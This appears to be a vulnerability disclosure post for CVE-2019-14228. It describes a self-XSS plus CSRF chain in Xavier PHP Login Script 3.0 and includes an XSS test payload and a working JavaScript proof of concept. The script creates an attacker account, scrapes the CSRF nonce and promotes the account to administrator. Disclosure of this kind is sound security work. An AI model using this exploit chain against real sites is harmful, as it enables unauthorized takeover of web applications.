---
layout: post
title: CVE-2019-14228 
tags: [CVE, XSS, CSRF, PHP]
author: Ingredous Labs
comment: true
---

```
Affected Software Name: Xavier PHP Login Script & Management Panel
Affected Version: 3.0
Vulnerability: Application Takeover via Self-XSS + CSRF Chain
CVE ID: CVE-2019-14228
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14228
```

# Introduction

Xavier 3.0 PHP Login Script & Management Panel is developed by Angry Frog and could be purchased by clicking [here](https://www.angry-frog.com/php-login-script/).

As stated on their website:

> The Xavier PHP Login Script is a user management system allowing the registration and administration of users to your website. 

# Exploitation Details

Xavier PHP Login Script allows Administrators to create new users by using the Management Panel. During a blackbox assessment, it was observed that causing the registration to fail such as using a password which doesn't meet the complexity policy would cause the application to reflect the username in the error message.

Attempting to register a username which contains Javascript such as `<img src=/ onerror=alert(1)>`, would cause the Javascript to be evaluated and executed by the browser as no sanitization is being performed thhus resulting in XSS (Cross-Site-Scripting.)

Unfortunately the impact here is completely mitigated as this would be a case of Self-XSS as the attacker would be required to either social engineer the Victim Administrator into inputting this payload along with causing the form to error.

However upon further observation, it was noticed that the endpoint which is responsible for creating a new user was missing CSRF protection. As seen in the request, there is no CSRF protection in the form of a token being passed along in the request nor was the application utilizing Same-Site Cookies.

With this, an Attacker is able to craft a proof of concept and host it on their website which upon being visited by the Victim Admin will have the browser follow the request and thus create a new user. However one caveat lies here and that is when a new user is created, they are automatically placed into the "Registered Users" aka the lowest privilege group. Long story short, an attacker would be able to achieve the same impact by using the self-registration feature and registering their own account. 

In order to upgrade a user's privileges, an Admin will need to browse to the Management Panel and promote the user. The endpoint which is responsible for promoting the user utilizes CSRF protection thus making it impossible to promote the Attacker's user to Admin via the same vector (CSRF).

One last piece remains and that is the Self-XSS. With the CSRF an attacker is able to leverage the Self-XSS into being remotely exploitable in the form of Reflected XSS. As an attacker is able to execute Javascript in the context of the Victim's browser, they are now able to bypass the Same Origin Policy (SOP) which therefore would allow the attacker to bypass the CSRF protection found on the endpoint which is responsible for promoting a user's privileges by including specially crafted Javascript found in the Proof of Concept section below. 

Upon the Javascript being executed in the context of the Victim Admin's browser, it will create a new account for the attacker and promote it to Administrator which is the highest privilege offered by the application thus allowing the attacker to effectively takeover the application by chaining together Self-XSS + CSRF. 


# Proof of Concept

~~~
var root = "";
var req = new XMLHttpRequest();
var url = root + "/xavier-demo/admin/includes/adminprocess.php";
var params = "user=Hackerman&firstname=Hackerman&lastname=Hackerman&pass=P4ssw0rd&conf_pass=P4ssw0rd& email=Hackerman%40Superman.com&conf_email=Hackerman%40Superman.com&form_submission=admin_registration";
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
var url2 = root + "/xavier-demo/admin/adminuseredit.php?usertoedit=Hackerman";
var regex = /delete-user" value="([^"]*?)"/g;
var req2 = new XMLHttpRequest();
req2.open("GET", url2, false);
req2.send();
var nonce = regex.exec(req2.responseText);
var nonce = nonce[1];
var url3 = root + "/xavier-demo/admin/includes/adminprocess.php";
var params2 = "delete-user="+nonce+"&form_submission=delete_user&usertoedit=Hackerman&button=Promotetoadmin";
req2.open("POST", url3, true);
req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req2.send(params2);
~~~

Upon this being executed, a new Administrator with the username of Hackerman and password of P4ssw0rd will created.